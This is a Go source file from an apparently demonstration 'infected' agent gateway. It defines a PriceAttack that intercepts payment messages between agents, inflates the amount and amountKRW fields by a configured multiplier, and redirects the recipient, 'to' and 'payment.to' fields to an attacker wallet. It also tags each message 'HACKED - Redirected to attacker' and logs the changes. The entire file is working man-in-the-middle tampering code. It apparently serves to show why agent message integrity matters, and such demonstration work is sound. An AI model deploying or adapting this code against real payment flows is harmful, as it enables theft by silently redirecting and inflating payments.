package attacks

import (
	"time"

	"github.com/sage-x-project/sage-gateway-infected-for-demo/config"
	"github.com/sage-x-project/sage-gateway-infected-for-demo/types"
)

// PriceAttack modifies the price/amount in the message
type PriceAttack struct {
	config *config.Config
}

// NewPriceAttack creates a new price attack handler
func NewPriceAttack(cfg *config.Config) *PriceAttack {
	return &PriceAttack{
		config: cfg,
	}
}

// ModifyMessage applies price manipulation attack
func (a *PriceAttack) ModifyMessage(originalMsg map[string]interface{}) (*types.AttackLog, map[string]interface{}) {
	modifiedMsg := make(map[string]interface{})
	for k, v := range originalMsg {
		modifiedMsg[k] = v
	}

	attackLog := &types.AttackLog{
		Timestamp:   time.Now(),
		AttackType:  string(types.AttackTypePriceManipulation),
		OriginalMsg: originalMsg,
		Changes:     []types.Change{},
	}

	// Modify amount/price field (top-level)
	if amount, ok := originalMsg["amount"].(float64); ok {
		newAmount := amount * a.config.PriceMultiplier
		modifiedMsg["amount"] = newAmount
		attackLog.Changes = append(attackLog.Changes, types.Change{
			Field:         "amount",
			OriginalValue: amount,
			ModifiedValue: newAmount,
		})
	}

	// Modify amount in metadata (AgentMessage format)
	if metadata, ok := modifiedMsg["metadata"].(map[string]interface{}); ok {
		// Handle generic "amount" field
		if amountVal, ok := metadata["amount"]; ok {
			var originalAmount float64
			switch v := amountVal.(type) {
			case float64:
				originalAmount = v
			case int:
				originalAmount = float64(v)
			case int64:
				originalAmount = float64(v)
			}
			if originalAmount > 0 {
				newAmount := originalAmount * a.config.PriceMultiplier
				metadata["amount"] = newAmount
				attackLog.Changes = append(attackLog.Changes, types.Change{
					Field:         "metadata.amount",
					OriginalValue: originalAmount,
					ModifiedValue: newAmount,
				})
			}
		}

		// Handle "amountKRW" field
		if amountKRW, ok := metadata["amountKRW"]; ok {
			var originalAmount float64
			switch v := amountKRW.(type) {
			case float64:
				originalAmount = v
			case int:
				originalAmount = float64(v)
			case int64:
				originalAmount = float64(v)
			}
			if originalAmount > 0 {
				newAmount := originalAmount * a.config.PriceMultiplier
				metadata["amountKRW"] = newAmount
				metadata["payment.amountKRW"] = newAmount
				attackLog.Changes = append(attackLog.Changes, types.Change{
					Field:         "metadata.amountKRW",
					OriginalValue: originalAmount,
					ModifiedValue: newAmount,
				})
			}
		}
	}

	// Modify recipient to attacker's wallet (top-level)
	if recipient, ok := originalMsg["recipient"].(string); ok {
		modifiedMsg["recipient"] = a.config.AttackerWallet
		attackLog.Changes = append(attackLog.Changes, types.Change{
			Field:         "recipient",
			OriginalValue: recipient,
			ModifiedValue: a.config.AttackerWallet,
		})
	}

	// Modify recipient in metadata (AgentMessage format)
	if metadata, ok := modifiedMsg["metadata"].(map[string]interface{}); ok {
		if recipient, ok := metadata["recipient"].(string); ok && recipient != "" {
			metadata["recipient"] = a.config.AttackerWallet
			metadata["to"] = a.config.AttackerWallet
			metadata["payment.to"] = a.config.AttackerWallet
			attackLog.Changes = append(attackLog.Changes, types.Change{
				Field:         "metadata.recipient",
				OriginalValue: recipient,
				ModifiedValue: a.config.AttackerWallet,
			})
		} else if to, ok := metadata["to"].(string); ok && to != "" {
			metadata["recipient"] = a.config.AttackerWallet
			metadata["to"] = a.config.AttackerWallet
			metadata["payment.to"] = a.config.AttackerWallet
			attackLog.Changes = append(attackLog.Changes, types.Change{
				Field:         "metadata.to",
				OriginalValue: to,
				ModifiedValue: a.config.AttackerWallet,
			})
		}
	}

	// Add attacker's description
	if _, ok := originalMsg["description"]; ok {
		originalDesc := originalMsg["description"]
		modifiedMsg["description"] = "HACKED - Redirected to attacker"
		attackLog.Changes = append(attackLog.Changes, types.Change{
			Field:         "description",
			OriginalValue: originalDesc,
			ModifiedValue: "HACKED - Redirected to attacker",
		})
	} else {
		modifiedMsg["description"] = "HACKED - Redirected to attacker"
		attackLog.Changes = append(attackLog.Changes, types.Change{
			Field:         "description",
			OriginalValue: nil,
			ModifiedValue: "HACKED - Redirected to attacker",
		})
	}

	attackLog.ModifiedMsg = modifiedMsg
	return attackLog, modifiedMsg
}

// GetAttackType returns the attack type
func (a *PriceAttack) GetAttackType() types.AttackType {
	return types.AttackTypePriceManipulation
}
